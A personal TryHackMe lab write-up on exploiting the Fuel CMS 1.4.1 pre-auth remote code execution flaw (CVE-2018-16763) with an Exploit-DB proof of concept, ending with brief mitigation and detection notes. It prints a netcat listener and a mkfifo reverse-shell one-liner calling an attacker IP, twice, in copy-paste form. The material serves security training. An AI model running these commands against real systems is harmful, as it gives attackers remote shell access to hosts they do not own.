# Vulnerability Capstone

# ðŸ” Vulnerability Capstone â€” Version disclosure + RCE + Reverse shell

**Platform:** TryHackMe / HTB / Local Lab

**Path:** Jr. Penetration Tester Â· Vulnerability Research

**Date:** 2025-11-06

**Author:** Jaco Chan

**Tags:** #pentest #vuln-research #searchsploit #tryhackme #reverse-shell

---

## TL;DR (1â€“2 lines)

*Concise outcome:* Located Exploit-DB PoC for Fuel CMS v1.4.1; PoC reviewed and tested in isolated VM;
Used reverse shell command to get the flag 

mitigation: patch to > v1.4.1.

---

## Objective (what I planned)

- Use nmap for reconnaissance
- Locate PoC using `searchsploit`
- Edit the PoC and run it
- Get reverse shell and locate the flag

---

## Environment (lab)

- **Attacker VM:** Kali 2025.x (host-only)
- **Victim VM:** TryHackMe / Fuel CMS v1.4 (lab-provided)
- **Network:** Host-only / NAT (no Internet for target)
- **Snapshots:** `nmap_vulnerability_capstone.jpg`
- **Files saved locally:** `~/Tryhackme/Vulnerability_Capstone/47138.py`, `~/Tryhackme/Vulnerability_Capstone/nmap.txt`

---

## Quick Commands (copy-paste)

```bash
# quick enumeration (example)
nmap -sC -sV target_ip

# search for exploits
searchsploit "Fuel CMS"

# mirror copy exploit to cwd
searchsploit -m linux/webapps/47138.py

# run listener
nc -lvnp 9001

# reverse shell (nc mkfifo)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.154.43 9001 >/tmp/f

```

## Steps Performed (commands)

```bash
# search for exploits
searchsploit "Fuel CMS"

# mirror copy exploit to cwd
searchsploit -m linux/webapps/47138.py

# look for the instructions and edit the url in the PoC

# run it with python2 and get a simple shell
sudo python2 47138.py

#run listener
nc -lvnp 9001

# paste the reverse shell code to get the reverse shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.11.154.43 9001 >/tmp/f
```

## Findings

- Exploit reference: CVE:2018-16763
- Vuln type: [Fuel CMS 1.4.1 - Remote Code Execution (3)](https://www.exploit-db.com/exploits/50477)
- Lab result: PoC caused a simple shell, which could initial outbound callback to attacker VM

## Analysis & Mitigation

- Cause: FUEL CMS 1.4.1 allows PHP Code Evaluation, which leads to Pre-Auth RCE.
- Mitigation: update system version > v1.4
- Detection idea: alert on unexpected outbound TCP connections and sudden process creation.

![Screenshot 2025-11-06 at 2.36.11â€¯PM.png](Vulnerability%20Capstone/Screenshot_2025-11-06_at_2.36.11_PM.png)